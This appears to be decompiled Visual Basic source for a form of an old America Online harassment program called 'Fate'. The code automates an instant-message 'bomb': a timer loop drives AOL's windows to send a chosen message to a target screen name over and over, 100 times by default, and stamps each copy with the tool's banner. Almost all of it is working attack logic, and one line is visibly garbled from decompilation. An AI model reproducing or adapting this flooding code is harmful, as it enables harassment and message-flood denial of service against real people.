' PUNT.FRM
Option Explicit

Sub sub99F8 ()
End Sub

Sub Command3D1_Click ()
punt.WindowState = 1
End Sub

Sub Command3D2_Click ()
Dim l0020 As Variant
Dim l0026 As Variant
Dim l002A As String
Dim l002E As Variant
l0020 = extfn1018("AOL FRAME25", 0&)
l0026 = extfn10F8(l0020, "Welcome")
l002A$ = String(30, 0)
l002E = extfnFA8(l0026, l002A$, 250)
If  l002E <= 7 Then
MsgBox "An error occurred: Not Signed On!", 16
Exit Sub
End If
If  Timer1.Interval = 0 Then
If  fn138() = 0 Then
MsgBox "Fate could not detect your version of America Online. Please Re-run America Online in order for Fate to work.", 16
Exit Sub
End If
If  Text1 = "" Then
MsgBox "Please enter in someone to punt!", 16
Exit Sub
End If
If  Text2 = "" Then
MsgBox "Please enter in a message to send!", 16
Exit Sub
End If
If  Text3.Text = "" Then
MsgBox "Please enter in how many times you want to mailbomb!", 16
Exit Sub
End If
If  Not IsNumeric(Text3.Text) Then
MsgBox "Please enter in a numeric number for how many times to bomb the person!", 16
Exit Sub
End If
Timer1.Enabled = True
Timer1.Interval = 1
Command3D2.Caption = "Stop"
Else
Timer1.Interval = 0
Timer1.Enabled = False
Command3D2.Caption = "Start"
End If
End Sub

Sub Command3D4_Click ()
End Sub

Sub Form_Load ()
If  punt.Caption <> fn8A8() Then
MsgBox "Program contains unauthorized changes." + Chr(13) + Chr(10) + "Terminating now!", 16
End
End If
Text3.Text = "100"
extsub1050 punt.hWnd, -1, 0, 0, 0, 0, 3
End Sub

Sub HScroll1_Change ()
End Sub

Sub Timer1_Timer ()
Dim l0056 As Variant
Dim l005A As Variant
Dim l005E As Variant
Dim l0062 As Variant
Dim l0068 As Variant
Dim l006C As Variant
Dim l0072 As Variant
Dim l0078 As Variant
Dim l007C As String
Dim l007E As Variant
l0056 = fn448()
l005A = extfn1018("AOL FRAME25", 0&)
For l005E = 1 To Text3.Text
If  Timer1.Interval = 0 Then GoTo L5D2C4
l0062 = fn138()
l0068 = fn5D0("Mem&bers", "Send an Instant Message")
DoEvents
10 :
l006C = extfn10F8(l005A, "Send Instant Message")
DoEvents
If  Timer1.Interval = 0 Then GoTo L5D2C4
If  l006C = 0 Then GoTo 10
l0072 = extfn10C0(l006C, "_AOL_EDIT")
l0078 = extfn11A0(l0072, 12, 0, Text1)
l007C$ = String(Len(Text1), 0)
l007E = extfn11A0(l0072, 13, Len(Text1) + 1, l007C$)
 ?+l007C$ <> Text1?


If  l0062 = 5 Then
l0084 = extfn1168(l0072, 2)
Else
l0084 = extfn10C0(l006C, "RICHCNTL")
End If
l0088 = extfn11A0(l0084, 12, 0, Text2 + Chr(13) + Chr(10) + Chr(13) + Chr(10) + "          «‹- -– Fate Instant Message Bomb –-- -›»")
If  l0062 = 5 Then
l008C = extfn10F8(l006C, "Send")
If  Timer1.Interval = 0 Then GoTo L5D2C4
l0092 = fn1480(l008C)
Else
l008C = extfn1168(l0084, 2)
l0092 = fn1480(l008C)
End If
Do Until 2 > 3
If  Timer1.Interval = 0 Then GoTo L5D2C4
If  l0062 = 5 Then
l0096 = extfn10F8(l006C, "Available?")
Else
l009A = extfn10F8(l005A, "To:")
l00A0 = extfn1088(l009A)
l00A4$ = String(255, 0)
l00A6 = extfnFA8(l00A0, l00A4$, 250)
If  l00A4$ Like "*Send Instant Message*" Then
l0096 = 1
Else
l0096 = 0
End If
End If
If  l0096 = 0 Then
GoTo 20
End If
l00AA = extfn1018("#32770", "America Online")
If  Timer1.Interval = 0 Then GoTo L5D2C4
If  l00AA > 0 Then
l00AE = extfn10F8(l00AA, "OK")
l00B2 = extfn1168(l00AE, 1)
l00B6$ = String(250, 0)
l00B8 = extfn11A0(l00B2, 13, 250, l00B6$)
l00BC = InStr(1, l00B6$, "signed", 1)
If  l00BC Then
l00C0 = fn1480(l00AE)
l00C6 = extfnFE0(l006C, 16, 0, 0)
MsgBox Text1 + " is not currently signed on!"
GoTo L5D2C4
Else
l00BC = InStr(1, l00B6$, "cannot", 1)
If  l00BC Then
l00C0 = fn1480(l00AE)
l00C6 = extfnFE0(l006C, 16, 0, 0)
MsgBox Text1 + " turned off Instant Messages!"
GoTo L5D2C4
End If
End If
End If
If  Timer1.Interval = 0 Then GoTo L5D2C4
DoEvents
Loop
20 :
DoEvents
Next l005E

L5D2C4:
l0056 = fn480()
Timer1.Interval = 0
Command3D2.Caption = "Start"
End Sub

Sub sub9980 ()
Unload punt
End Sub
